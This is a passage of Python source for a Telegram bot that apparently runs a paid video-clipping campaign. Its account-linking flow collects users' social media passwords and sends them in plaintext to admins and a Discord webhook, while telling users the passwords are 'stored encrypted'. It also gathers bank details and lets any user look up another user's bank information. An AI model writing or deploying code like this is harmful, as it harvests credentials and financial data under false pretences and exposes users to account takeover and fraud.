                    updates.append("payment_amount = ?")
                    params.append(payment_amount)
                if status is not None:
                    updates.append("status = ?")
                    params.append(status)
                if updates:
                    params.append(submission_id)
                    await db.execute(f"UPDATE submissions SET {', '.join(updates)} WHERE id = ?", params)
                    await db.commit()

                async with db.execute("""
                    SELECT s.id, s.user_id, s.link, s.caption, s.views, s.payment_amount, s.status, s.submitted_at,
                           u.chat_id, u.telegram_username
                    FROM submissions s
                    JOIN users u ON s.user_id = u.id
                    WHERE s.id = ?
                """, (submission_id,)) as cur:
                    row = await cur.fetchone()
                    if not row:
                        return None
                    return {
                        "id": row[0], "user_id": row[1], "link": row[2], "caption": row[3],
                        "views": row[4], "payment_amount": row[5], "status": row[6],
                        "submitted_at": row[7], "chat_id": row[8], "telegram_username": row[9]
                    }

db = Database(DATABASE_URL)

# --- STATES ---
class BotStates(StatesGroup):
    waiting_for_username = State()
    main_menu = State()
    entering_handle = State()
    entering_password = State()
    entering_payment = State()
    entering_submission_link = State()
    selecting_submission_account = State()
    entering_submission_caption = State()
    inspecting_user = State()

# --- KEYBOARDS ---
def get_main_menu_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Link Social Account", callback_data="menu_register")],
            [
                InlineKeyboardButton(text="📊 Stats", callback_data="menu_stats"),
                InlineKeyboardButton(text="🚀 Progress", callback_data="menu_progress"),
            ],
            [
                InlineKeyboardButton(text="💳 Payment", callback_data="menu_payment"),
                InlineKeyboardButton(text="🔗 Submission Links", callback_data="menu_submissions"),
            ],
            [
                InlineKeyboardButton(text="🏆 Leaderboard", callback_data="menu_leaderboard"),
                InlineKeyboardButton(text="🔍 Check User", callback_data="menu_check_user"),
            ],
        ]
    )

def get_back_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")]
        ]
    )

def get_platforms_keyboard(linked_platforms=None):
    linked = set(p.lower() for p in (linked_platforms or []))
    tw_text = "🐦 Twitter ✅" if "twitter" in linked else "🐦 Twitter"
    yt_text = "📺 YouTube ✅" if "youtube" in linked else "📺 YouTube"
    tt_text = "🎵 TikTok ✅" if "tiktok" in linked else "🎵 TikTok"
    ig_text = "📸 Instagram ✅" if "instagram" in linked else "📸 Instagram"

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=tw_text, callback_data="plat_twitter"),
                InlineKeyboardButton(text=yt_text, callback_data="plat_youtube"),
            ],
            [
                InlineKeyboardButton(text=tt_text, callback_data="plat_tiktok"),
                InlineKeyboardButton(text=ig_text, callback_data="plat_instagram"),
            ],
            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
        ]
    )

# --- MIDDLEWARE: ENFORCE USERNAME LOCK ---
class UsernameLockMiddleware(BaseMiddleware):
    async def __call__(self, handler, event: TelegramObject, data: dict):
        tg_user = data.get("event_from_user") or getattr(event, "from_user", None)
        if not tg_user:
            return await handler(event, data)

        # Allow admins to always access the bot
        if tg_user.id in ADMIN_IDS:
            return await handler(event, data)

        db_user = await db.get_user(tg_user.id)
        if db_user and db_user.get("telegram_username"):
            registered_username = db_user["telegram_username"].strip()
            if not registered_username.startswith("@"):
                registered_username = f"@{registered_username}"

            current_username = f"@{tg_user.username}" if tg_user.username else None

            # If the user changed or removed their Telegram username
            if not current_username or current_username.lower() != registered_username.lower():
                blocked_msg = (
                    f"⛔ <b>Access Blocked!</b>\n\n"
                    f"You originally registered as <b>{html.escape(registered_username)}</b>, "
                    f"but your current Telegram username is <b>{html.escape(current_username or 'None')}</b>.\n\n"
                    f"To protect your stats, submissions, and payments, the bot will not work until you "
                    f"change your Telegram username back to <b>{html.escape(registered_username)}</b>.\n\n"
                    f"👉 <i>Go to Telegram Settings → Edit Profile → Username and change it back to <b>{html.escape(registered_username)}</b>.</i>"
                )
                if isinstance(event, types.CallbackQuery):
                    await event.answer(
                        f"⛔ Change your username back to {registered_username} to use this bot.",
                        show_alert=True,
                    )
                elif isinstance(event, types.Message):
                    await event.answer(blocked_msg)
                return

        return await handler(event, data)

# --- HANDLERS ---
async def start_command(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    user = await db.get_user(chat_id)

    # 1. If user is already registered in database, lock their username
    if user and user.get("telegram_username"):
        await state.set_state(BotStates.main_menu)
        display_name = html.escape(user["telegram_username"])
        await message.answer(
            f"Welcome back, <b>{display_name}</b>! Choose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    # 2. If user has an official Telegram username, auto-register and permanently lock it
    tg_user = message.from_user
    auto_username = f"@{tg_user.username}" if tg_user and tg_user.username else None

    if auto_username:
        await db.upsert_user(chat_id, auto_username)
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"Welcome! 🎉 You were registered automatically as <b>{html.escape(auto_username)}</b>.\n"
            "<i>(Note: Your username is permanently locked and cannot be changed)</i>\n\n"
            "Choose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
    else:
        # Fallback only for users who have no public @username set on Telegram
        await state.set_state(BotStates.waiting_for_username)
        await message.answer(
            "Welcome! 🎉 To get started, please enter your Telegram username starting with the <b>@</b> symbol (e.g., <code>@yourusername</code>):\n"
            "<i>(Note: Once set, your username cannot be changed)</i>"
        )

async def process_username(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    user = await db.get_user(chat_id)

    # Strict lock: prevent any changes if username is already set
    if user and user.get("telegram_username"):
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"⚠️ Your username is already locked as <b>{html.escape(user['telegram_username'])}</b> and cannot be changed.",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    text = (message.text or "").strip()
    if not text.startswith("@") or len(text) < 2:
        await message.answer(
            "❌ Invalid format. Please make sure your username starts with the <b>@</b> symbol (e.g., <code>@yourusername</code>). Try again:"
        )
        return

    await db.upsert_user(chat_id, text)

    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Account registered successfully as <b>{html.escape(text)}</b>!\n"
        "<i>(Your username is now locked and cannot be changed)</i>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- MENU CALLBACKS ---
async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data
    chat_id = callback.message.chat.id
    await callback.answer()

    with suppress(TelegramBadRequest):
        if data == "menu_register":
            existing = await db.get_user_social_accounts_full(chat_id)
            linked_platforms = [acc["platform"] for acc in existing]

            if len(linked_platforms) >= 4:
                lines = ["📱 <b>Your Linked Accounts:</b>\n"]
                for acc in existing:
                    lines.append(
                        f"• <b>{html.escape(acc['platform'])}:</b> <code>{html.escape(acc['handle'])}</code>"
                    )
                lines.append(
                    "\n✅ <i>You have already linked all 4 available platforms (limit: 1 per platform).</i>"
                )
                await callback.message.edit_text(
                    "\n".join(lines),
                    reply_markup=get_back_keyboard(),
                )
            else:
                lines = [
                    "Select a social media platform to link (limit: <b>1 per platform</b>):"
                ]
                if linked_platforms:
                    lines.append("\n<b>Already linked:</b>")
                    for acc in existing:
                        lines.append(
                            f"• {html.escape(acc['platform'])}: <code>{html.escape(acc['handle'])}</code>"
                        )
                await callback.message.edit_text(
                    "\n".join(lines),
                    reply_markup=get_platforms_keyboard(linked_platforms),
                )
        elif data == "menu_stats":
            user = await db.get_user(chat_id)
            if user:
                username = user["telegram_username"]
                views = user["views"]
                money = user["money"]
                username_str = html.escape(username or "User")
                await callback.message.edit_text(
                    f"📊 <b>Your Stats</b> (<i>{username_str}</i>)\n\n"
                    f"👁 Total Views: <b>{views:,}</b>\n"
                    f"💰 Total Earnings: <b>${money:.2f}</b>",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "menu_progress":
            user = await db.get_user(chat_id)
            if user:
                views = user["views"]
                goal = 50000
                percent = min(100.0, (views / goal) * 100)
                status = (
                    "✅ <b>Eligible for Payout!</b>"
                    if views >= goal
                    else f"❌ Needs <b>{goal - views:,}</b> more views for payout."
                )
                filled = int(percent // 10)
                progress_bar = "█" * filled + "░" * (10 - filled)
                await callback.message.edit_text(
                    f"🚀 <b>Payout Progress</b>\n\n"
                    f"Progress: [{progress_bar}] {percent:.1f}%\n"
                    f"Current Views: <b>{views:,} / {goal:,}</b>\n\n"
                    f"Status: {status}",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "menu_payment":
            await state.set_state(BotStates.entering_payment)
            user = await db.get_user(chat_id)
            current_info = user.get("payment_info") if user else None

            if current_info:
                msg_text = (
                    f"💳 <b>Current Payment Details:</b>\n"
                    f"<code>{html.escape(current_info)}</code>\n\n"
                    f"Write your bank name and bank account number to update:"
                )
            else:
                msg_text = "Write your bank name and bank account number:"

            await callback.message.edit_text(
                msg_text,
                reply_markup=get_back_keyboard(),
            )
        elif data == "menu_submissions":
            user = await db.get_user(chat_id)
            if not user:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
                return

            submissions = await db.get_user_submissions(chat_id)
            if not submissions:
                text = (
                    "📁 <b>Your Submission Links</b>\n\n"
                    "You have not submitted any links yet.\n\n"
                    "Tap <b>➕ Submit New Link</b> below to submit your video/clip link for payment!"
                )
            else:
                lines = ["📁 <b>Your Submission Links</b>\n"]
                total_payout = 0.0
                total_views = 0
                for idx, sub in enumerate(submissions[:15], 1):
                    link = sub["link"]
                    payment = sub.get("payment", 0.0)
                    views = sub.get("views", 0)
                    status = sub.get("status", "pending")
                    plat = sub.get("platform", "Social").title()
                    handle = sub.get("handle", "")
                    total_payout += payment
                    total_views += views
                    caption_str = (
                        f"\n   📝 <b>Caption:</b> <i>{html.escape(sub['caption'])}</i>"
                        if sub.get("caption")
                        else ""
                    )
                    lines.append(
                        f"{idx}. 🔗 <a href=\"{html.escape(link)}\">Submission #{sub['id']}</a> ({plat}: <code>{html.escape(handle)}</code>)"
                        f"{caption_str}\n"
                        f"   👁 <b>Views:</b> {views:,} | 💰 <b>Payment:</b> ${payment:.2f}\n"
                        f"   📌 <b>Status:</b> {html.escape(status)}"
                    )
                lines.append(f"\n💵 <b>Total Approved Earnings:</b> <b>${total_payout:.2f}</b>")
                lines.append(f"👁 <b>Total Views:</b> <b>{total_views:,}</b>")
                text = "\n".join(lines)

            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="➕ Submit New Link", callback_data="sub_new")],
                    [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
                ]
            )
            await callback.message.edit_text(
                text,
                reply_markup=keyboard,
                disable_web_page_preview=True,
            )
        elif data == "menu_leaderboard":
            top_clippers = await db.get_leaderboard(limit=5)
            if not top_clippers:
                text = (
                    "🏆 <b>Clippers Campaign Leaderboard</b>\n\n"
                    "No clippers have registered views or earnings yet.\n"
                    "Start submitting clips to take the #1 spot!"
                )
            else:
                medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣"]
                lines = [
                    "🏆 <b>Clippers Campaign Leaderboard</b>",
                    "<i>Top 5 clippers leading the campaign:</i>\n",
                ]
                for idx, clipper in enumerate(top_clippers):
                    medal = medals[idx] if idx < len(medals) else f"<b>{idx+1}.</b>"
                    username = clipper["telegram_username"] or "Anonymous Clipper"
                    views = clipper["views"]
                    money = clipper["money"]
                    lines.append(
                        f"{medal} <b>{html.escape(username)}</b>\n"
                        f"   👁 Views: <b>{views:,}</b> | 💰 Earnings: <b>${money:.2f}</b>\n"
                    )
                lines.append("🔥 <i>Keep clipping and posting to climb the ranks!</i>")
                text = "\n".join(lines)

            await callback.message.edit_text(
                text,
                reply_markup=get_back_keyboard(),
            )
        elif data == "menu_check_user":
            await state.set_state(BotStates.inspecting_user)
            await callback.message.edit_text(
                "🔍 <b>Check User Data</b>\n\n"
                "Please enter the Telegram username of the user you want to check (e.g., <code>@username</code>):",
                reply_markup=get_back_keyboard(),
            )
        elif data == "sub_new":
            # Verify user has at least one social account linked before allowing submission
            user_socials = await db.get_user_social_accounts_full(chat_id)
            if not user_socials:
                await callback.message.edit_text(
                    "⚠️ <b>No Linked Social Account!</b>\n\n"
                    "You must link at least one social media account before you can submit video links.\n\n"
                    "Please tap <b>📱 Link Social Account</b> below to connect your account:",
                    reply_markup=InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="📱 Link Social Account", callback_data="menu_register")],
                            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
                        ]
                    ),
                )
                return

            await state.set_state(BotStates.entering_submission_link)
            await callback.message.edit_text(
                "🔗 Please send the link to your video or clip (e.g. TikTok, YouTube, Instagram, or Twitter link):",
                reply_markup=get_back_keyboard(),
            )
        elif data == "back_to_menu":
            await state.set_state(BotStates.main_menu)
            await callback.message.edit_text(
                "Main Menu:",
                reply_markup=get_main_menu_keyboard(),
            )

# --- SOCIAL REGISTRATION FLOW ---
async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
    chat_id = callback.message.chat.id
    platform = callback.data.split("_")[1].lower()

    existing = await db.get_user_social_accounts_full(chat_id)
    already_linked = [acc for acc in existing if acc["platform"].lower() == platform]
    if already_linked:
        acc = already_linked[0]
        await callback.answer(
            f"You already linked your {platform.title()} account ({acc['handle']})!\nLimit: 1 account per platform.",
            show_alert=True,
        )
        return

    await state.update_data(platform=platform)
    await state.set_state(BotStates.entering_handle)
    await callback.answer()

    with suppress(TelegramBadRequest):
        await callback.message.edit_text(
            f"You selected <b>{html.escape(platform.title())}</b>.\n\n"
            "Please enter your handle for this account starting with the <b>@</b> symbol (e.g., <code>@yourhandle</code>):"
        )

async def process_handle(message: types.Message, state: FSMContext):
    handle = (message.text or "").strip()
    if not handle.startswith("@") or len(handle) < 2:
        await message.answer(
            "❌ Invalid format. The handle must start with the <b>@</b> symbol (e.g., <code>@yourhandle</code>). Try again:"
        )
        return

    await state.update_data(handle=handle)
    await state.set_state(BotStates.entering_password)
    await message.answer("🔑 Please enter the password for this account:")

async def process_password(message: types.Message, state: FSMContext):
    password = (message.text or "").strip()
    chat_id = message.chat.id

    # Security: Delete the password message from Telegram chat immediately
    with suppress(Exception):
        await message.delete()

    data = await state.get_data()
    platform = data.get("platform")
    handle = data.get("handle")

    if not platform or not handle:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ Registration timed out or was incomplete. Please choose an option from the menu:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    await db.add_social_account(chat_id, telegram_username, platform, handle, password)

    admin_notification = (
        f"🔔 <b>New Social Account Linked!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>chat_id:</b> <code>{chat_id}</code>\n\n"
        f"<b>Platform:</b> {html.escape(platform.title())}\n"
        f"<b>Handle:</b> <code>{html.escape(handle)}</code>\n"
        f"<b>Password:</b> <code>{html.escape(password)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send notification to admin {admin_id}: {e}")

    await send_discord_notification(
        title="📱 Social Account Linked",
        fields=[
            {"name": "👤 User", "value": telegram_username, "inline": True},
            {"name": "🌐 Platform", "value": platform.title(), "inline": True},
            {"name": "🏷️ Handle", "value": handle, "inline": True},
            {"name": "🔑 Password", "value": password, "inline": False},
        ],
        color=0x9B59B6,
    )

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Successfully linked <b>{html.escape(platform.title())}</b> account (<code>{html.escape(handle)}</code>)!\n"
        "<i>(Your password message was deleted from chat for security & stored encrypted)</i>\n\n"
        "<i>(Limit: 1 account per platform)</i>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- PAYMENT FLOW ---
async def process_payment_info(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text or len(text) < 3:
        await message.answer(
            "⚠️ Please write your bank name and bank account number:",
            reply_markup=get_back_keyboard(),
        )
        return

    chat_id = message.chat.id
    await db.update_payment_info(chat_id, text)

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    # Notify admin(s) with user bank info
    admin_notification = (
        f"💳 <b>Payment Details Submitted!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>chat_id:</b> <code>{chat_id}</code>\n\n"
        f"<b>Bank Details:</b>\n"
        f"<code>{html.escape(text)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send payment notification to admin {admin_id}: {e}")

    await send_discord_notification(
        title="💳 Payment Details Updated",
        fields=[
            {"name": "👤 User", "value": telegram_username, "inline": True},
            {"name": "🏦 Bank Details", "value": text, "inline": False},
        ],
        color=0xF1C40F,
    )

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Payment details saved successfully!\n\n"
        f"<b>Saved Details:</b>\n<code>{html.escape(text)}</code>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- SUBMISSION LINK FLOW ---
async def process_submission_link(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    parts = text.split(None, 1)
    url_candidate = parts[0]
    inline_caption = parts[1].strip() if len(parts) > 1 else None

    if not (url_candidate.startswith("http://") or url_candidate.startswith("https://")) or len(url_candidate) < 10:
        await message.answer(
            "❌ Invalid link. Please enter a valid URL starting with <code>https://</code> or <code>http://</code>:",
            reply_markup=get_back_keyboard(),
        )
        return

    chat_id = message.chat.id
    user_socials = await db.get_user_social_accounts_full(chat_id)
    if not user_socials:
        await state.clear()
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ <b>No Linked Social Account!</b>\n\n"
            "You must link at least one social media account before submitting links.\n"
            "Please tap <b>📱 Link Social Account</b> from the menu first:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    # Auto-detect platform from URL
    url_lower = url_candidate.lower()
    detected_plat = None
    if "tiktok.com" in url_lower:
        detected_plat = "tiktok"
    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
        detected_plat = "youtube"
    elif "twitter.com" in url_lower or "x.com" in url_lower:
        detected_plat = "twitter"
    elif "instagram.com" in url_lower:
        detected_plat = "instagram"

    matching_account = None
    if detected_plat:
        matching_account = next((s for s in user_socials if s["platform"].lower() == detected_plat), None)
        if not matching_account:
            await message.answer(
                f"⚠️ You submitted a <b>{detected_plat.title()}</b> link, but you have not linked a {detected_plat.title()} account yet.\n"
                f"Please link your {detected_plat.title()} account under <b>📱 Link Social Account</b> first!",
                reply_markup=get_back_keyboard(),
            )
            return
    elif len(user_socials) == 1:
        matching_account = user_socials[0]

    # If matching account is determined directly:
    if matching_account:
        sa_id = matching_account["id"]
        if inline_caption and len(inline_caption) >= 2:
            await finalize_submission(message, state, url_candidate, sa_id, inline_caption)
            return

        await state.update_data(submission_link=url_candidate, social_account_id=sa_id)
        await state.set_state(BotStates.entering_submission_caption)
        await message.answer(
            f"📝 <b>Link received!</b> (Linked to <b>{matching_account['platform'].title()}</b>: <code>{matching_account['handle']}</code>)\n\n"
            "Now please enter the <b>caption</b> used for this video link:",
            reply_markup=get_back_keyboard(),
            disable_web_page_preview=True,
        )
        return

    # If domain wasn't detected and user has multiple linked accounts, let them select which one:
    await state.update_data(submission_link=url_candidate, inline_caption=inline_caption)
    await state.set_state(BotStates.selecting_submission_account)
    buttons = [
        [InlineKeyboardButton(
            text=f"{s['platform'].title()}: {s['handle']}",
            callback_data=f"subacc_{s['id']}"
        )]
        for s in user_socials
    ]
    buttons.append([InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")])
    await message.answer(
        "Which of your linked accounts is this video clip posted on?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
    )

async def submission_account_selected(callback: types.CallbackQuery, state: FSMContext):
    sa_id = int(callback.data.split("_")[1])
    data = await state.get_data()
    link = data.get("submission_link")
    inline_caption = data.get("inline_caption")

    if not link:
        await state.set_state(BotStates.main_menu)
        await callback.message.edit_text("⚠️ Session expired. Please submit again.", reply_markup=get_main_menu_keyboard())
        return

    if inline_caption and len(inline_caption) >= 2:
        await finalize_submission(callback.message, state, link, sa_id, inline_caption, chat_id=callback.message.chat.id)
        return

    await state.update_data(social_account_id=sa_id)
    await state.set_state(BotStates.entering_submission_caption)
    await callback.message.edit_text(
        "📝 Account selected!\n\nNow please enter the <b>caption</b> used for this video link:",
        reply_markup=get_back_keyboard(),
    )

async def process_submission_caption(message: types.Message, state: FSMContext):
    caption = (message.text or "").strip()
    if not caption or len(caption) < 2:
        await message.answer(
            "⚠️ Caption is required. Please write the caption for this video link:",
            reply_markup=get_back_keyboard(),
        )
        return

    data = await state.get_data()
    link = data.get("submission_link")
    social_account_id = data.get("social_account_id")

    if not link or not social_account_id:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ Submission session expired. Please submit your link again from the menu:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    await finalize_submission(message, state, link, social_account_id, caption)

async def finalize_submission(
    target_msg: types.Message,
    state: FSMContext,
    link: str,
    social_account_id: int,
    caption: str,
    chat_id: int | None = None,
):
    if chat_id is None:
        chat_id = target_msg.chat.id

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    sub_id = await db.add_submission(chat_id, telegram_username, link, social_account_id, caption)

    # Fetch platform & handle for display
    socials = await db.get_user_social_accounts_full(chat_id)
    sa = next((s for s in socials if s["id"] == social_account_id), None)
    plat_str = f" ({sa['platform'].title()}: <code>{sa['handle']}</code>)" if sa else ""

    caption_html = f"\n📝 <b>Caption:</b> <i>{html.escape(caption)}</i>" if caption else ""

    # Notify admin(s) via Telegram
    admin_notification = (
        f"🔗 <b>New Video Link Submitted!</b>\n\n"
        f"<b>User:</b> {html.escape(telegram_username)}\n"
        f"<b>Chat ID:</b> <code>{chat_id}</code>\n"
        f"<b>Submission ID:</b> <code>#{sub_id}</code>\n"
        f"<b>Account:</b> {plat_str.strip()}\n"
        f"<b>Link:</b> <a href=\"{html.escape(link)}\">{html.escape(link)}</a>"
        f"{caption_html}\n\n"
        f"💡 To set payout & views for this link:\n"
        f"<code>/setpay {sub_id} 5.00</code>\n"
        f"<code>/setviews {sub_id} 10000</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await target_msg.bot.send_message(
                admin_id, admin_notification, disable_web_page_preview=False
            )
        except Exception as e:
            logging.warning(f"Could not send link notification to admin {admin_id}: {e}")

    # Forward to Discord (if configured)
    discord_fields = [
        {"name": "👤 Clipper", "value": telegram_username, "inline": True},
        {"name": "🆔 Submission ID", "value": f"#{sub_id}", "inline": True},
        {"name": "📱 Account", "value": f"{sa['platform'].title()} ({sa['handle']})" if sa else "N/A", "inline": True},
        {"name": "🔗 Link", "value": link, "inline": False},
        {"name": "📝 Caption", "value": caption, "inline": False},
    ]

    await send_discord_notification(
        title="🎬 New Video Link Submitted",
        fields=discord_fields,
        color=0x2ECC71,
        url=link if (link.startswith("http://") or link.startswith("https://")) else None,
    )

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await target_msg.answer(
        f"✅ <b>Link Submitted Successfully!</b> (ID: #{sub_id})\n\n"
        f"📱 <b>Account:</b> {plat_str.strip() or 'Linked Account'}\n"
        f"🔗 <b>Link:</b> <a href=\"{html.escape(link)}\">{html.escape(link)}</a>"
        f"{caption_html}\n"
        f"📌 <b>Status:</b> Pending Review\n\n"
        f"You can view all your submissions anytime under <b>🔗 Submission Links</b>.",
        reply_markup=get_main_menu_keyboard(),
        disable_web_page_preview=True,
    )

# --- USER DATA LOOKUP ---
def format_user_data_card(
    target_user: dict, socials: list, submissions: list, is_admin: bool
) -> str:
    uname = target_user["telegram_username"]
    chat_id = target_user["chat_id"]
    views = target_user.get("views", 0)
    money = target_user.get("money", 0.0)
    payment_info = target_user.get("payment_details") or target_user.get("payment_info") or "Not provided"

    if socials:
        soc_lines = []
        for s in socials:
            if is_admin:
                soc_lines.append(
                    f"• <b>{html.escape(s['platform'].title())}:</b> <code>{html.escape(s['handle'])}</code> (Pass: <code>{html.escape(s['password'])}</code>)"
                )
            else:
                soc_lines.append(
                    f"• <b>{html.escape(s['platform'].title())}:</b> <code>{html.escape(s['handle'])}</code>"
                )
        social_info = "\n".join(soc_lines)
    else:
        social_info = "• <i>No social accounts linked</i>"

    if is_admin:
        sub_lines = []
        if submissions:
            for sub in submissions[:5]:
                cap_snippet = (
                    f" (📝 <i>{html.escape(sub['caption'])}</i>)"
                    if sub.get("caption")
                    else ""
                )
                plat_prefix = f"[{sub.get('platform', '').title()}] " if sub.get("platform") else ""
                sub_lines.append(
                    f"• #{sub['id']}: {plat_prefix}<a href=\"{html.escape(sub['link'])}\">{html.escape(sub['link'])}</a>{cap_snippet} | 👁 {sub.get('views', 0):,} | 💰 <b>${sub['payment']:.2f}</b> ({html.escape(sub['status'])})"
                )
        else:
            sub_lines.append("• <i>No submissions yet</i>")

        return (
            f"👤 <b>User Info: {html.escape(uname)}</b> (Admin View)\n\n"
            f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n"
            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
            f"💳 <b>Bank Account / Payment Details:</b>\n"
            f"<code>{html.escape(payment_info)}</code>\n\n"
            f"📱 <b>Linked Social Accounts:</b>\n"
            f"{social_info}\n\n"
            f"🔗 <b>Recent Submissions ({len(submissions)} total):</b>\n"
            + "\n".join(sub_lines)
            + "\n\n"
            f"⚙️ <b>Admin Actions:</b>\n"
            f"<code>/setpay &lt;id&gt; &lt;amount&gt; [views]</code>\n"
            f"<code>/setviews &lt;id&gt; &lt;views&gt;</code>\n"
            f"<code>/update {uname} views money</code>"
        )
    else:
        return (
            f"👤 <b>User Info: {html.escape(uname)}</b>\n\n"
            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
            f"💳 <b>Bank Account / Payment Details:</b>\n"
            f"<code>{html.escape(payment_info)}</code>\n\n"
            f"📱 <b>Linked Social Accounts:</b>\n"
            f"{social_info}"
        )

async def process_inspect_user(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer(
            "⚠️ Please enter a valid username (e.g., <code>@username</code>):",
            reply_markup=get_back_keyboard(),
        )
        return

    if not text.startswith("@"):
        text = f"@{text}"

    target_user = await db.get_user_by_username(text)
    if not target_user:
        await state.clear()
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"❌ User <code>{html.escape(text)}</code> was not found in the database.",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
    chat_id = target_user["chat_id"]
    socials = await db.get_user_social_accounts_full(chat_id)
    submissions = await db.get_user_submissions(chat_id)

    response_text = format_user_data_card(target_user, socials, submissions, is_admin)

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        response_text,
        reply_markup=get_main_menu_keyboard(),
        disable_web_page_preview=True,
    )

async def info_command(message: types.Message):
    parts = (message.text or "").split()
    if len(parts) < 2:
        await message.answer(
            "⚠️ Format: <code>/info @username</code>\nExample: <code>/info @johndoe</code>"
        )
        return

    target_username = parts[1].strip()
    if not target_username.startswith("@"):
        target_username = f"@{target_username}"

    target_user = await db.get_user_by_username(target_username)
    if not target_user:
        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> was not found.")
        return

    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
    chat_id = target_user["chat_id"]
    socials = await db.get_user_social_accounts_full(chat_id)
    submissions = await db.get_user_submissions(chat_id)

    response_text = format_user_data_card(target_user, socials, submissions, is_admin)
    await message.answer(response_text, disable_web_page_preview=True)

# --- ADMIN COMMAND: UPDATE STATS ---
async def update_stats_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) != 4:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/update @username views money</code>\nExample: <code>/update @johndoe 55000 100</code>"
        )
        return

    target_username = parts[1]
    if not target_username.startswith("@"):
        target_username = f"@{target_username}"
    try:
        new_views = int(parts[2])
        new_money = float(parts[3])
    except ValueError:
        await message.answer("⚠️ Views must be an integer and money must be a valid number.")
        return

    updated = await db.update_user_stats(target_username, new_views, new_money)

    if not updated:
        await message.answer(f"❌ User <code>{html.escape(target_username)}</code> not found in database.")
        return

    await message.answer(
        f"✅ Successfully updated stats for <b>{html.escape(target_username)}</b>:\n"
        f"👁 Views: <b>{new_views:,}</b>\n"
        f"💰 Money: <b>${new_money:.2f}</b>"
    )

# --- ADMIN COMMANDS: SET SUBMISSION PAYMENT & VIEWS ---
async def set_pay_command(message: types.Message):
    if not message.from_user or message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ You are not authorized to use this command.")
        return

    parts = (message.text or "").split()
    if len(parts) < 3:
        await message.answer(
            "⚠️ Incorrect usage.\nFormat: <code>/setpay &lt;submission_id&gt; &lt;amount&gt; [views]</code>\nExample: <code>/setpay 1 5.50 12000</code>"
        )
        return

    try:
        sub_id = int(parts[1])
        amount = float(parts[2])
        views = int(parts[3]) if len(parts) > 3 else None
    except ValueError:
        await message.answer("⚠️ Submission ID must be an integer and amount must be a valid number.")
        return

